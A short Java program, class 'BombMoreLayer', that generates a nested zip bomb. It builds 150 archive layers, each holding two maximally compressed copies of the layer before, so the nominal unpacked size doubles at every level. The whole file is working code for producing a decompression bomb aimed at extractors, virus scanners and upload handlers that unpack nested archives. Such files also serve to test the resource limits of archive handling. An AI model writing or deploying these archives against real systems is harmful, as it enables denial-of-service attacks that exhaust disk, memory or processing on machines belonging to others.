package com.twitter.teruteru128.test.zip;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class BombMoreLayer {

    public static void main(String[] args) {
        File src;
        File out;
        byte[] buf = new byte[1024];
        for (int j = 0; j < 150; j++) {
            src = new File(j + ".zip");
            out = new File((j + 1) + ".zip");
            // src=new File("image.html");
            // out=new File("output.zip");
            try {
                if (!out.exists()) {
                    out.createNewFile();
                }
                ZipOutputStream zos = new ZipOutputStream(
                        new BufferedOutputStream(new BufferedOutputStream(
                                new BufferedOutputStream(new FileOutputStream(
                                        out)))));
                try {
                    zos.setLevel(9);
                    BufferedInputStream bin;
                    for (int i = 0, filecnt = 2; i < filecnt; i++) {
                        String filename = String.format("%x.zip", i);
                        zos.putNextEntry(new ZipEntry(filename));
                        // zos.putNextEntry(new ZipEntry("49304296_p0.jpg"));
                        bin = new BufferedInputStream(new BufferedInputStream(
                                new BufferedInputStream(
                                        new FileInputStream(src))));
                        try {
                            int readedsize = -1;
                            while ((readedsize = bin.read(buf)) != -1) {
                                zos.write(buf, 0, readedsize);
                            }
                        } finally {
                            bin.close();
                        }
                        zos.closeEntry();
                        System.out.println(filename);
                    }
                } finally {
                    zos.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

}
